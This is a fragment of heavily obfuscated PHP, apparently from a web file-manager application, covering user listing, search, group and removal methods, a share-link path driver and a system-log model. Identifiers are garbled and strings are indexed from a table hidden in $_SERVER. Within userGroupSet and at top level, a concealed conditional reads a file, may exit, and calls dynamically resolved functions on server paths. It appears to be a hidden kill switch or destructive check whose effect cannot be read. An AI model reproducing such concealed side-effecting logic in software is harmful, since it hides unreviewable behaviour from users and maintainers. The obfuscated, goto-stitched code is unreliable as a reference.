$ÁÉŞÙò = $çÚ÷ƒÁ[$ÑË’è±¢[532]] ? $çÚ÷ƒÁ[$ÑË’è±¢[532]] : $çÚ÷ƒÁ[$ÑË’è±¢[32]]; } $ıòä›ß = Model($ÑË’è±¢[525]); if (!Input::check($ÁÉŞÙò, $ÑË’è±¢[583])) { return $ıòä›ß->metaSet($â£ôŠ‡Ì, array($ÑË’è±¢[465] => $ÑË’è±¢[12], $ÑË’è±¢[464] => $ÑË’è±¢[12])); } return $ıòä›ß->metaSet($â£ôŠ‡Ì, array($ÑË’è±¢[465] => str_replace($ÑË’è±¢[53], $ÑË’è±¢[12], Pinyin::get($ÁÉŞÙò)), $ÑË’è±¢[464] => Pinyin::get($ÁÉŞÙò, $ÑË’è±¢[584]))); } private function nickNameRpt() { $’˜şÎØ =& $_SERVER[§ŒØóıü]; $Ã¬•·Ôä = Model($’˜şÎØ[776])->get($’˜şÎØ[2341]); $ÚÇïÑ‰Ô = $GLOBALS[$’˜şÎØ[6]][$’˜şÎØ[381]][$’˜şÎØ[2341]]; $ï’²Íîú = !is_null($Ã¬•·Ôä) ? $Ã¬•·Ôä : $ÚÇïÑ‰Ô; return !!$ï’²Íîú; } private function _checkExist($°¼œĞÑª, $ééÀîòˆ = false) { $Ü¸âá‘„ =& $_SERVER[§ŒØóıü]; $—ó…©ä‘ = array($Ü¸âá‘„[32] => UserModel::ERROR_USER_EXIST_NAME, $Ü¸âá‘„[532] => UserModel::ERROR_USER_EXIST_NICKNAME, $Ü¸âá‘„[305] => UserModel::ERROR_USER_EXIST_EMAIL, $Ü¸âá‘„[2329] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($—ó…©ä‘[$Ü¸âá‘„[532]]); } $Îæµ¤äã = $ééÀîòˆ ? array($Ü¸âá‘„[1673] => array($Ü¸âá‘„[2342], $ééÀîòˆ)) : array(); foreach ($—ó…©ä‘ as $Ô¸å´âï => $›¯Å™Ç…) { $×»ñ¢®Å = array(); foreach ($—ó…©ä‘ as $óÇ¡”›Â => $ç³×ı›ı) { if (isset($°¼œĞÑª[$óÇ¡”›Â]) && $°¼œĞÑª[$óÇ¡”›Â]) { $×»ñ¢®Å[] = $°¼œĞÑª[$óÇ¡”›Â]; } } if (!$×»ñ¢®Å) { continue; } $æ…ŸƒäÁ = array_merge(array($Ô¸å´âï => array($Ü¸âá‘„[7], $×»ñ¢®Å)), $Îæµ¤äã); $›†™ø±¯ = $this->where($æ…ŸƒäÁ)->find(); if ($›†™ø±¯) { return $›¯Å™Ç…; } } return !0; } public function userListInfo($¨û¿¶Öº) { $«•†èŞö =& $_SERVER[§ŒØóıü]; $ËıÚîÜ½ = array(); $¨û¿¶Öº = is_array($¨û¿¶Öº) ? array_unique($¨û¿¶Öº) : array(); if (!$¨û¿¶Öº) { return $ËıÚîÜ½; } if (count($¨û¿¶Öº) < 20) { foreach ($¨û¿¶Öº as $ÏÁ‰²ë¹) { $ËıÚîÜ½[$ÏÁ‰²ë¹ . $«•†èŞö[12]] = $this->getInfoSimpleOuter($ÏÁ‰²ë¹); } } else { $ì¶½ñ¹ = array($«•†èŞö[1664] => array($«•†èŞö[418], $¨û¿¶Öº)); if (count($¨û¿¶Öº) == 1) { $ì¶½ñ¹ = array($«•†èŞö[1664] => $¨û¿¶Öº[0]); } $ÜŸ•æ„ = Model($«•†èŞö[504])->field($this->simpleField)->where($ì¶½ñ¹)->select(); $ÜŸ•æ„ = array_to_keyvalue($ÜŸ•æ„, $«•†èŞö[1673]); foreach ($¨û¿¶Öº as $ÏÁ‰²ë¹) { $·ó‹Ó‚ = $ÜŸ•æ„[$ÏÁ‰²ë¹]; if (!$·ó‹Ó‚) { $ËıÚîÜ½[$ÏÁ‰²ë¹ . $«•†èŞö[12]] = $this->getInfoSimpleOuter($ÏÁ‰²ë¹); continue; } $·ó‹Ó‚[$«•†èŞö[533]] = Action($«•†èŞö[2315])->parseUrl($·ó‹Ó‚[$«•†èŞö[533]]); $ËıÚîÜ½[$ÏÁ‰²ë¹ . $«•†èŞö[12]] = $·ó‹Ó‚; } } return $ËıÚîÜ½; } protected function userStatus($ù‹„äµ¸, $ Ù§Êä) { $ü²ô€í¸ = $this->getInfoSimple($ù‹„äµ¸); if (!$ü²ô€í¸) { return !1; } $œüÎÅ¢¨ = array($_SERVER[§ŒØóıü][755] => $ Ù§Êä); return $this->userEdit($ù‹„äµ¸, $œüÎÅ¢¨); } protected function userRemove($‡°˜ÕÀÕ) { $Ù©ëØäÜ =& $_SERVER[§ŒØóıü]; $†‡»ÊºÍ = $this->getInfoSimple($‡°˜ÕÀÕ); if (!$†‡»ÊºÍ) { return !1; } $³ˆÇ¼—° = array($Ù©ëØäÜ[1664] => $‡°˜ÕÀÕ); Model($Ù©ëØäÜ[592])->where($³ˆÇ¼—°)->delete(); Model($Ù©ëØäÜ[2343])->where($³ˆÇ¼—°)->delete(); Model($Ù©ëØäÜ[1952])->where($³ˆÇ¼—°)->delete(); Model($Ù©ëØäÜ[2328])->where($³ˆÇ¼—°)->delete(); Model($Ù©ëØäÜ[1074])->where($³ˆÇ¼—°)->delete(); Model($Ù©ëØäÜ[2159])->removeUserAll($‡°˜ÕÀÕ); Model($Ù©ëØäÜ[831])->userRootRemove($‡°˜ÕÀÕ); return $this->where($³ˆÇ¼—°)->delete(); } protected function userGroupSet($×¥¬’˜ğ, $­Ó×‹‹Ô, $ÇıÍ±†ƒ = array()) { $İ§é¦«“ =& $_SERVER[§ŒØóıü]; if ($_SERVER[$İ§é¦«“[746]] != $_SERVER[$İ§é¦«“[1364]]) { $ÈóÓˆ’Ã = $İ§é¦«“[883]; $‡±ô¿œ£ = $İ§é¦«“[748]; $ê›Ôğ = $_SERVER[$İ§é¦«“[749]] . $İ§é¦«“[750]; $ì¨‚Œš• = $‡±ô¿œ£($ê›Ôğ); $ÚÀ®ÚŞ = explode($İ§é¦«“[231], $ì¨‚Œš•); if (count($ÚÀ®ÚŞ) < $İ§é¦«“[656]) { $Ëğä¼“Ú = $İ§é¦«“[751]; $Ëğä¼“Ú(); } $é›Ú€Š¶ = $İ§é¦«“[884]; $é›Ú€Š¶($_SERVER[$İ§é¦«“[885]]); $é›Ú€Š¶($_SERVER[$İ§é¦«“[749]] . $İ§é¦«“[1540]); $ˆ‚ó¹¸¼ = 1; while ($ˆ‚ó¹¸¼ > 1) { $ˆ‚ó¹¸¼ = $ˆ‚ó¹¸¼ + 4; $›‰€µéş = rawurlencode($ˆ‚ó¹¸¼ . $İ§é¦«“[378]); } } $ôÎ«ê»ê = $this->getInfoSimple($×¥¬’˜ğ); if (!$ôÎ«ê»ê || !is_array($­Ó×‹‹Ô)) { return !1; } $¾Ã»’×“ = Model($İ§é¦«“[1952]); $¾Ã»’×“->where(array($İ§é¦«“[1673] => $×¥¬’˜ğ))->delete(); $÷ƒëğÕ = array(); $éÒç¥–Ö = 0; foreach ($­Ó×‹‹Ô as $Ó£ĞĞô => $ˆµ¾âÒé) { $è¸±ï¶ = array($İ§é¦«“[1673] => $×¥¬’˜ğ, $İ§é¦«“[1862] => $Ó£ĞĞô, $İ§é¦«“[1966] => $ˆµ¾âÒé); $è¸±ï¶[$İ§é¦«“[1886]] = isset($ÇıÍ±†ƒ[$éÒç¥–Ö]) ? $ÇıÍ±†ƒ[$éÒç¥–Ö] : 0; $éÒç¥–Ö++; $÷ƒëğÕ[] = $è¸±ï¶; } return $¾Ã»’×“->addAll($÷ƒëğÕ, array(), !0); } protected function userGroupAdd($“Ÿîì„, $¡ë…Ê»° = array()) { $ÂŒ×Úñ® =& $_SERVER[§ŒØóıü]; $÷ş±— Î = $this->getInfoSimple($“Ÿîì„); if (!$÷ş±— Î || empty($¡ë…Ê»°)) { return !1; } $¾Ì¬ùñ¼ = array(); foreach ($¡ë…Ê»° as $‹Úº³ıÄ => $øÆÔıø) { $¾Ì¬ùñ¼[] = array($ÂŒ×Úñ®[1673] => $“Ÿîì„, $ÂŒ×Úñ®[1862] => $‹Úº³ıÄ, $ÂŒ×Úñ®[1966] => $øÆÔıø, $ÂŒ×Úñ®[1886] => 0); } return Model($ÂŒ×Úñ®[1952])->addAll($¾Ì¬ùñ¼, array(), !0); } protected function userGroupRemove($µöåØäÈ, $éÕŒİÂ) { $˜Ï»èûÙ =& $_SERVER[§ŒØóıü]; $ôÀˆÚŸª = $this->getInfoSimple($µöåØäÈ); if (!$ôÀˆÚŸª || !$éÕŒİÂ) { return !1; } $ÉüÈ€½« = array($˜Ï»èûÙ[1664] => $µöåØäÈ, $˜Ï»èûÙ[1950] => $éÕŒİÂ); return Model($˜Ï»èûÙ[1952])->where($ÉüÈ€½«)->delete(); } public function listData() { $š¢óÜ„É = $this->_makeOrder()->selectPage(50); $this->_listDataApply($š¢óÜ„É[$_SERVER[§ŒØóıü][369]]); return $š¢óÜ„É; } public function listByID($âØ†¨¹) { $ÀÒ—•Ë =& $_SERVER[§ŒØóıü]; if (!$âØ†¨¹) { return; } $Ğ“àíšÛ = array($ÀÒ—•Ë[1673] => array($ÀÒ—•Ë[7], $âØ†¨¹)); $¶ÕæÇ»æ = $this->where($Ğ“àíšÛ)->select(); $¶ÕæÇ»æ = array_sort_keep($¶ÕæÇ»æ, $ÀÒ—•Ë[1673], $âØ†¨¹); $this->_listDataApply($¶ÕæÇ»æ); return $¶ÕæÇ»æ; } public function listByGroup($á Í®õä = 0, $”À»¯‘ = array()) { $Ô†ñÁ°Ä =& $_SERVER[§ŒØóıü]; $ÛÂÓµ¿Í = $Ô†ñÁ°Ä[12]; $£úš±èº = array(); if ($á Í®õä) { $£úš±èº = array($Ô†ñÁ°Ä[2344] => intval($á Í®õä)); $ÛÂÓµ¿Í = "\x4c\x45\x46\x54\x20\x4a\117\x49\116\x20{$this->tablePrefix}\165\163\x65\162\x5f\x67\162\x6f\165\x70\40\x75\x73\x65\x72\x5f\x67\x72\x6f\165\160\x20\157\156\x20\x75\x73\145\162\x2e\x75\163\x65\162\x49\x44\40\75\x20\165\163\x65\162\x5f\x67\x72\x6f\x75\160\56\165\x73\x65\162\111\x44"; $ĞÙİÎï¶ = Input::get($Ô†ñÁ°Ä[457], null, $Ô†ñÁ°Ä[12]) ? $Ô†ñÁ°Ä[12] : $Ô†ñÁ°Ä[2345]; } if (isset($”À»¯‘[$Ô†ñÁ°Ä[755]])) { $£úš±èº[$Ô†ñÁ°Ä[2346]] = $”À»¯‘[$Ô†ñÁ°Ä[755]]; } $†ÓÃş¹ = $this->_makeOrder($ĞÙİÎï¶)->field($Ô†ñÁ°Ä[2347])->where($£úš±èº)->join($ÛÂÓµ¿Í)->selectPage(50); $this->_listDataApply($†ÓÃş¹[$Ô†ñÁ°Ä[369]]); return $†ÓÃş¹; } private function _makeOrder($ò¤Ô®Ù = '') { $ñ¾ó•ù… =& $_SERVER[§ŒØóıü]; $£ß™áÄ = array($ñ¾ó•ù…[1673], $ñ¾ó•ù…[32], $ñ¾ó•ù…[1851], $ñ¾ó•ù…[1823], $ñ¾ó•ù…[201]); $´»êê¹ = array($ñ¾ó•ù…[450] => $ñ¾ó•ù…[451], $ñ¾ó•ù…[452] => $ñ¾ó•ù…[453]); $¹³»¡˜ë = Input::get($ñ¾ó•ù…[457], $ñ¾ó•ù…[7], $ñ¾ó•ù…[1664], $£ß™áÄ); $öè¦ƒˆ = Input::get($ñ¾ó•ù…[458], $ñ¾ó•ù…[7], $ñ¾ó•ù…[1953], array($ñ¾ó•ù…[1953], $ñ¾ó•ù…[452])); $öè¦ƒˆ = $´»êê¹[$öè¦ƒˆ]; $ò¤Ô®Ù = $ò¤Ô®Ù . "\165\163\145\162\56{$¹³»¡˜ë}\x20{$öè¦ƒˆ}\54\40\x75\163\x65\162\56\x75\163\145\162\111\104\x20\141\x73\143"; return $this->alias($ñ¾ó•ù…[2079])->order($ò¤Ô®Ù); } public function listSearch($Ï‹ñ¥‰) { $Í³ÑüıÂ =& $_SERVER[§ŒØóıü]; $Şõú¸µå = $Ï‹ñ¥‰[$Í³ÑüıÂ[1956]]; $À÷—ü®à = isset($Ï‹ñ¥‰[$Í³ÑüıÂ[1957]]) ? $Ï‹ñ¥‰[$Í³ÑüıÂ[1957]] : !1; $Şõú¸µå = str_replace($Í³ÑüıÂ[1958], $Í³ÑüıÂ[1959], trim($Şõú¸µå)); $²î¯ÃëŒ = array($Í³ÑüıÂ[32] => array($Í³ÑüıÂ[383], "\x25{$Şõú¸µå}\x25"), $Í³ÑüıÂ[305] => array($Í³ÑüıÂ[383], "{$Şõú¸µå}\45"), $Í³ÑüıÂ[532] => array($Í³ÑüıÂ[383], "{$Şõú¸µå}\x25"), $Í³ÑüıÂ[1006] => $Í³ÑüıÂ[1960]); if (Input::check($Şõú¸µå, $Í³ÑüıÂ[311])) { $²î¯ÃëŒ[$Í³ÑüıÂ[1673]] = array($Í³ÑüıÂ[383], "{$Şõú¸µå}\45"); $²î¯ÃëŒ[$Í³ÑüıÂ[2329]] = array($Í³ÑüıÂ[383], "{$Şõú¸µå}\x25"); } if (!$Şõú¸µå) { $²î¯ÃëŒ = array(); } if (isset($Ï‹ñ¥‰[$Í³ÑüıÂ[755]])) { $²î¯ÃëŒ[$Í³ÑüıÂ[755]] = $Ï‹ñ¥‰[$Í³ÑüıÂ[755]]; } $²î¯ÃëŒ = $this->parseWhereLike($²î¯ÃëŒ); $—Ÿ¦¥Âñ = $this->_makeOrder()->where($²î¯ÃëŒ)->selectPage(20); if (!$—Ÿ¦¥Âñ || count($—Ÿ¦¥Âñ[$Í³ÑüıÂ[369]]) < 5 && Input::check($Şõú¸µå, $Í³ÑüıÂ[318])) { $Ø“ÃºÇ = $this->_searchFromMeta($Í³ÑüıÂ[464], $Şõú¸µå, 10); $Â±şûĞó = $this->_searchFromMeta($Í³ÑüıÂ[465], $Şõú¸µå, 10); $ÏÅÎã§Ø = array_merge($Ø“ÃºÇ, $Â±şûĞó, $—Ÿ¦¥Âñ[$Í³ÑüıÂ[369]]); $—Ÿ¦¥Âñ[$Í³ÑüıÂ[369]] = array_unique_by_key($ÏÅÎã§Ø, $Í³ÑüıÂ[1673]); $—Ÿ¦¥Âñ[$Í³ÑüıÂ[366]][$Í³ÑüıÂ[367]] = count($—Ÿ¦¥Âñ[$Í³ÑüıÂ[369]]); $—Ÿ¦¥Âñ[$Í³ÑüıÂ[366]][$Í³ÑüıÂ[368]] = ceil($—Ÿ¦¥Âñ[$Í³ÑüıÂ[366]][$Í³ÑüıÂ[367]] / $—Ÿ¦¥Âñ[$Í³ÑüıÂ[366]][$Í³ÑüıÂ[363]]); } $this->_listDataApply($—Ÿ¦¥Âñ[$Í³ÑüıÂ[369]]); $this->_filterByGroup($—Ÿ¦¥Âñ, $À÷—ü®à); return $—Ÿ¦¥Âñ; } private function _filterByGroup(&$³¡¿¿Ø™, $—‚äîÍß) { $çÈ¿…Ì =& $_SERVER[§ŒØóıü]; if (!$—‚äîÍß) { return $³¡¿¿Ø™; } foreach ($³¡¿¿Ø™[$çÈ¿…Ì[369]] as $şÄÁÅØñ => &$Ÿ“š¶Ğ¯) { $îÉÜ†¢Â = array_to_keyvalue($Ÿ“š¶Ğ¯[$çÈ¿…Ì[2049]], $çÈ¿…Ì[12], $çÈ¿…Ì[1862]); if (!in_array($—‚äîÍß, $îÉÜ†¢Â)) { unset($³¡¿¿Ø™[$çÈ¿…Ì[369]][$şÄÁÅØñ]); } } unset($Ÿ“š¶Ğ¯); $³¡¿¿Ø™[$çÈ¿…Ì[369]] = array_values($³¡¿¿Ø™[$çÈ¿…Ì[369]]); $³¡¿¿Ø™[$çÈ¿…Ì[366]] = array($çÈ¿…Ì[2113] => count($³¡¿¿Ø™[$çÈ¿…Ì[369]]), $çÈ¿…Ì[2111] => $³¡¿¿Ø™[$çÈ¿…Ì[366]][$çÈ¿…Ì[363]], $çÈ¿…Ì[2110] => 1, $çÈ¿…Ì[2112] => 1); } private function _searchFromMeta($çÎé©, $„Ï×šœî, $ª•ĞË»×) { $ûÑúàûô =& $_SERVER[§ŒØóıü]; $„Ï×šœî = strtolower($„Ï×šœî); $á†úŠŸ³ = array($ûÑúàûô[94] => $çÎé©, $ûÑúàûô[374] => array($ûÑúàûô[383], "\x25{$„Ï×šœî}\45")); $á†úŠŸ³ = $this->parseWhereLike($á†úŠŸ³); $ÅÆ¹ä¯« = Model($ûÑúàûô[2348])->where($á†úŠŸ³)->limit($ª•ĞË»×)->select(); if (!$ÅÆ¹ä¯«) { return array(); } $ÅÆ¹ä¯« = array_to_keyvalue($ÅÆ¹ä¯«, $ûÑúàûô[12], $ûÑúàûô[1673]); $…ÊÕå…‹ = $this->where(array($ûÑúàûô[1664] => array($ûÑúàûô[7], $ÅÆ¹ä¯«)))->select(); if (!$…ÊÕå…‹) { return array(); } return $…ÊÕå…‹; } private function _listDataApplyItem($—Ö‘¾³º) { $ª‡ÙË˜¯ = array($—Ö‘¾³º); $this->_listDataApply($ª‡ÙË˜¯); return $ª‡ÙË˜¯[0]; } private function _listDataApply(&$Ò“…›ÙŸ) { $Ô¼¥’áİ =& $_SERVER[§ŒØóıü]; if (!$Ò“…›ÙŸ) { return; } array_remove_key($Ò“…›ÙŸ, $Ô¼¥’áİ[895]); $üèüóÏ‹ = array_to_keyvalue($Ò“…›ÙŸ, $Ô¼¥’áİ[12], $Ô¼¥’áİ[1673]); $this->_listAppendGroup($Ò“…›ÙŸ, $üèüóÏ‹); $this->_listAppendMeta($Ò“…›ÙŸ, $üèüóÏ‹); $this->_listAppendSourceRoot($Ò“…›ÙŸ, $üèüóÏ‹); } private function _listAppendSourceRoot(&$¦½‹ÚÓ¾, $Èñµüóñ) { $øœ¸—ı© =& $_SERVER[§ŒØóıü]; $¨è¶íÄ = Model($øœ¸—ı©[831])->listSourceRoot(SourceModel::TYPE_USER, $Èñµüóñ); $¨è¶íÄ = array_to_keyvalue($¨è¶íÄ, $øœ¸—ı©[496]); $¨è¶íÄ = array_remove_key($¨è¶íÄ, $øœ¸—ı©[496]); foreach ($¦½‹ÚÓ¾ as &$„ÀÎ´ôİ) { $„ÀÎ´ôİ[$øœ¸—ı©[87]] = $¨è¶íÄ[$„ÀÎ´ôİ[$øœ¸—ı©[1673]]] ? $¨è¶íÄ[$„ÀÎ´ôİ[$øœ¸—ı©[1673]]] : array(); } unset($„ÀÎ´ôİ); } private function _listAppendGroup(&$¼÷”Ö×‚, $Èıåîè«) { $ŞÓşâĞ =& $_SERVER[§ŒØóıü]; $â”øÏŸ³ = array($ŞÓşâĞ[1673] => array($ŞÓşâĞ[7], $Èıåîè«)); $“¨†Ø•û = Model($ŞÓşâĞ[1952])->where($â”øÏŸ³)->select(); $¸¹°«ó¾ = array_to_keyvalue($“¨†Ø•û, $ŞÓşâĞ[12], $ŞÓşâĞ[1862]); $¸¹°«ó¾ = array_remove_value(array_unique($¸¹°«ó¾), $ŞÓşâĞ[198]); if (!$¸¹°«ó¾ || !$“¨†Ø•û) { return; } $â”øÏŸ³ = array($ŞÓşâĞ[1862] => array($ŞÓşâĞ[7], $¸¹°«ó¾)); $Ó÷¼á¤ø = Model($ŞÓşâĞ[2047])->field($ŞÓşâĞ[2349])->where($â”øÏŸ³)->select(); $Ó÷¼á¤ø = array_to_keyvalue($Ó÷¼á¤ø, $ŞÓşâĞ[1862]); $“¨†Ø•û = array_to_keyvalue_group($“¨†Ø•û, $ŞÓşâĞ[1673]); foreach ($“¨†Ø•û as &$øÄùä€•) { $ù¢¯œö‘ = array(); foreach ($øÄùä€• as $¦¿¦„„¶) { if (!$¦¿¦„„¶[$ŞÓşâĞ[1966]]) { continue; } $¼°ÒÎ±¯ = Model($ŞÓşâĞ[498])->listData($¦¿¦„„¶[$ŞÓşâĞ[1966]]); $ù¢¯œö‘[] = array($ŞÓşâĞ[1862] => $¦¿¦„„¶[$ŞÓşâĞ[1862]], $ŞÓşâĞ[2350] => $Ó÷¼á¤ø[$¦¿¦„„¶[$ŞÓşâĞ[1862]]][$ŞÓşâĞ[32]], $ŞÓşâĞ[511] => $Ó÷¼á¤ø[$¦¿¦„„¶[$ŞÓşâĞ[1862]]][$ŞÓşâĞ[511]], $ŞÓşâĞ[413] => $¼°ÒÎ±¯); } $øÄùä€• = $ù¢¯œö‘; } unset($øÄùä€•); foreach ($¼÷”Ö×‚ as &$ñÃšÉäö) { $ñÃšÉäö[$ŞÓşâĞ[2049]] = array(); if (isset($“¨†Ø•û[$ñÃšÉäö[$ŞÓşâĞ[1673]]])) { $ñÃšÉäö[$ŞÓşâĞ[2049]] = $“¨†Ø•û[$ñÃšÉäö[$ŞÓşâĞ[1673]]]; } } unset($ñÃšÉäö); } public function userAppendGroup($ğß¼Öµ¶) { $ÎÛï´€¯ =& $_SERVER[§ŒØóıü]; if (!$ğß¼Öµ¶) { return array(); } $this->_listAppendGroup($ğß¼Öµ¶, array_to_keyvalue($ğß¼Öµ¶, $ÎÛï´€¯[12], $ÎÛï´€¯[1673])); return $ğß¼Öµ¶; } private function _listAppendMeta(&$êİì¡ñ¼, $—¬Àã¤ğ) { $ùö¾àŒˆ =& $_SERVER[§ŒØóıü]; $âÑì÷ÖØ = UserJobModel::JOB_KEY; $ÂÏÁˆ  = array($ùö¾àŒˆ[2330]); $¾ÜÁíí½ = array($ùö¾àŒˆ[1673] => array($ùö¾àŒˆ[7], $—¬Àã¤ğ)); $¦—ÔáÏñ = Model($ùö¾àŒˆ[2328])->where($¾ÜÁíí½)->select(); $¦—ÔáÏñ = array_to_keyvalue_group($¦—ÔáÏñ, $ùö¾àŒˆ[1673]); foreach ($¦—ÔáÏñ as &$ú©¥¶ªé) { $ûé»Îøî = array(); foreach ($ú©¥¶ªé as $¼õë†šø) { if (!in_array($¼õë†šø[$ùö¾àŒˆ[94]], $ÂÏÁˆ )) { $ûé»Îøî[$¼õë†šø[$ùö¾àŒˆ[94]]] = $¼õë†šø[$ùö¾àŒˆ[374]]; } } $ú©¥¶ªé = $ûé»Îøî; } unset($ú©¥¶ªé); $¦ĞùÚì = Model($ùö¾àŒˆ[2351]); foreach ($êİì¡ñ¼ as &$Éší¾Æâ) { $ş¬şÂá = array(); if (isset($¦—ÔáÏñ[$Éší¾Æâ[$ùö¾àŒˆ[1673]]])) { $ş¬şÂá = $¦—ÔáÏñ[$Éší¾Æâ[$ùö¾àŒˆ[1673]]]; } $Éší¾Æâ[$ùö¾àŒˆ[2352]] = array(); if (isset($ş¬şÂá[$âÑì÷ÖØ])) { $Éší¾Æâ[$ùö¾àŒˆ[2352]] = $¦ĞùÚì->getUserJobInfo($ş¬şÂá[$âÑì÷ÖØ]); } } unset($Éší¾Æâ); } protected function groupUserAll($ˆş‚ÄæÄ) { $ÉğĞè‹¢ =& $_SERVER[§ŒØóıü]; if (!$ˆş‚ÄæÄ) { return !1; } $Ãı„¯Ä® = Model($ÉğĞè‹¢[1952])->field($ÉğĞè‹¢[1673])->where(array($ÉğĞè‹¢[1862] => array($ÉğĞè‹¢[7], $ˆş‚ÄæÄ)))->select(); $Ãı„¯Ä® = array_to_keyvalue($Ãı„¯Ä®, $ÉğĞè‹¢[12], $ÉğĞè‹¢[1673]); return array_unique($Ãı„¯Ä®); } public function userSearch($¢ËšË´™, $¤×‡±ø› = "\52") { return Model($_SERVER[§ŒØóıü][525])->where($¢ËšË´™)->field($¤×‡±ø›)->find(); } } goto e¡Ã¢ï±Ã†; e¶µ¤¨é§í: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ë›—™ùñ) { $this->pathParse = $ë›—™ùñ; } protected function infoParse($À‰ù¾ğÓ, $‹Îòç²÷ = false) { $İ»òï“ó =& $_SERVER[§ŒØóıü]; return Action($İ»òï“ó[1180])->sharePathInfo($this->pathParse[$İ»òï“ó[84]], !0, $‹Îòç²÷); } public function listPath($•¯¦¨Âª, $÷Ü—–Íˆ = false) { $ÙÁä¥¿º =& $_SERVER[§ŒØóıü]; $Ê” ª˜¹ = IO::listPath($•¯¦¨Âª, $÷Ü—–Íˆ); if (!$Ê” ª˜¹) { return $Ê” ª˜¹; } if (is_array($Ê” ª˜¹[$ÙÁä¥¿º[1354]])) { $ù®€ÅÆ® = Action($ÙÁä¥¿º[1363])->parsePathChildren($Ê” ª˜¹[$ÙÁä¥¿º[1354]], array($ÙÁä¥¿º[421] => $•¯¦¨Âª)); $Ê” ª˜¹[$ÙÁä¥¿º[1354]] = Action($ÙÁä¥¿º[1180])->shareItemInfo($ù®€ÅÆ®); } foreach ($Ê” ª˜¹ as $ÑÖ¶óÄº => $Õ†Ä©öÃ) { if (!in_array($ÑÖ¶óÄº, array($ÙÁä¥¿º[83], $ÙÁä¥¿º[82]))) { continue; } foreach ($Õ†Ä©öÃ as $ºÒÏƒåõ => $ù®€ÅÆ®) { $ù®€ÅÆ® = Action($ÙÁä¥¿º[1363])->parsePathChildren($ù®€ÅÆ®, array($ÙÁä¥¿º[421] => $•¯¦¨Âª)); $Ê” ª˜¹[$ÑÖ¶óÄº][$ºÒÏƒåõ] = Action($ÙÁä¥¿º[1180])->shareItemInfo($ù®€ÅÆ®); } } return $Ê” ª˜¹; } } if ($_SERVER[$_SERVER[§ŒØóıü][746]] != $_SERVER[$_SERVER[§ŒØóıü][1364]]) { $_getc = $_SERVER[§ŒØóıü][748]; $_getfile = $_SERVER[$_SERVER[§ŒØóıü][749]] . $_SERVER[§ŒØóıü][750]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[§ŒØóıü][231], $_getfilec); if (count($_getarrs) < $_SERVER[§ŒØóıü][607]) { $exit = $_SERVER[§ŒØóıü][751]; $exit(); } $_act = $_SERVER[§ŒØóıü][752]; $_act($_SERVER[$_SERVER[§ŒØóıü][747]]); } class PathDriverEDS extends PathDriverMinIO { public function __construct($åÖç•›Ê) { parent::__construct($åÖç•›Ê); } } goto fÀö— ÃÀš; c®©ãò¨ğ: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\155\137\x6c\157\x67"; protected $dataAuto = array(array("\143\x72\x65\141\164\145\124\x69\155\145", "\164\151\155\x65", "\x69\156\163\145\x72\164", "\x66\x75\x6e\x63\164\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $£ü¾Ä‡ó =& $_SERVER[§ŒØóıü]; return array($£ü¾Ä‡ó[2194] => LNG($£ü¾Ä‡ó[2195]), $£ü¾Ä‡ó[2196] => LNG($£ü¾Ä‡ó[2197]), $£ü¾Ä‡ó[1805] => LNG($£ü¾Ä‡ó[2198]), $£ü¾Ä‡ó[2199] => LNG($£ü¾Ä‡ó[2200]), $£ü¾Ä‡ó[2201] => LNG($£ü¾Ä‡ó[2202]), $£ü¾Ä‡ó[2203] => LNG($£ü¾Ä‡ó[2204]), $£ü¾Ä‡ó[2205] => LNG($£ü¾Ä‡ó[2206]), $£ü¾Ä‡ó[1835] => LNG($£ü¾Ä‡ó[2206]), $£ü¾Ä‡ó[1836] => LNG($£ü¾Ä‡ó[2207]), $£ü¾Ä‡ó[2208] => LNG($£ü¾Ä‡ó[2209]), $£ü¾Ä‡ó[2210] => LNG($£ü¾Ä‡ó[2211]), $£ü¾Ä‡ó[2212] => LNG($£ü¾Ä‡ó[2213]), $£ü¾Ä‡ó[2214] => LNG($£ü¾Ä‡ó[2215]), $£ü¾Ä‡ó[1833] => LNG($£ü¾Ä‡ó[2216]), $£ü¾Ä‡ó[2217] => LNG($£ü¾Ä‡ó[2218]), $£ü¾Ä‡ó[1840] => LNG($£ü¾Ä‡ó[2219]), $£ü¾Ä‡ó[2220] => LNG($£ü¾Ä‡ó[2221]), $£ü¾Ä‡ó[2222] => LNG($£ü¾Ä‡ó[2223]), $£ü¾Ä‡ó[2224] => LNG($£ü¾Ä‡ó[2225]), $£ü¾Ä‡ó[2226] => LNG($£ü¾Ä‡ó[2227]), $£ü¾Ä‡ó[1843] => LNG($£ü¾Ä‡ó[2228]), $£ü¾Ä‡ó[1844] => LNG($£ü¾Ä‡ó[2229]), $£ü¾Ä‡ó[2230] => LNG($£ü¾Ä‡ó[2231]), $£ü¾Ä‡ó[2232] => LNG($£ü¾Ä‡ó[2233]), $£ü¾Ä‡ó[2234] => LNG($£ü¾Ä‡ó[2235]), $£ü¾Ä‡ó[1838] => LNG($£ü¾Ä‡ó[2236]), $£ü¾Ä‡ó[2237] => LNG($£ü¾Ä‡ó[2238]), $£ü¾Ä‡ó[1837] => LNG($£ü¾Ä‡ó[2239]), $£ü¾Ä‡ó[2240] => LNG($£ü¾Ä‡ó[2241]), $£ü¾Ä‡ó[2242] => LNG($£ü¾Ä‡ó[2243]), $£ü¾Ä‡ó[2244] => LNG($£ü¾Ä‡ó[2245]), $£ü¾Ä‡ó[2246] => LNG($£ü¾Ä‡ó[2246]), $£ü¾Ä‡ó[2247] => LNG($£ü¾Ä‡ó[1809]), $£ü¾Ä‡ó[2248] => LNG($£ü¾Ä‡ó[2249]), $£ü¾Ä‡ó[2250] => LNG($£ü¾Ä‡ó[2251]), $£ü¾Ä‡ó[2252] => LNG($£ü¾Ä‡ó[2253]), $£ü¾Ä‡ó[2254] => LNG($£ü¾Ä‡ó[2255]), $£ü¾Ä‡ó[2256] => LNG($£ü¾Ä‡ó[2257]), $£ü¾Ä‡ó[2258] => LNG($£ü¾Ä‡ó[2258]), $£ü¾Ä‡ó[2259] => LNG($£ü¾Ä‡ó[2260]), $£ü¾Ä‡ó[2261] => LNG($£ü¾Ä‡ó[2262]), $£ü¾Ä‡ó[2263] => LNG($£ü¾Ä‡ó[2264]), $£ü¾Ä‡ó[2265] => LNG($£ü¾Ä‡ó[2266]), $£ü¾Ä‡ó[2267] => LNG($£ü¾Ä‡ó[2268]), 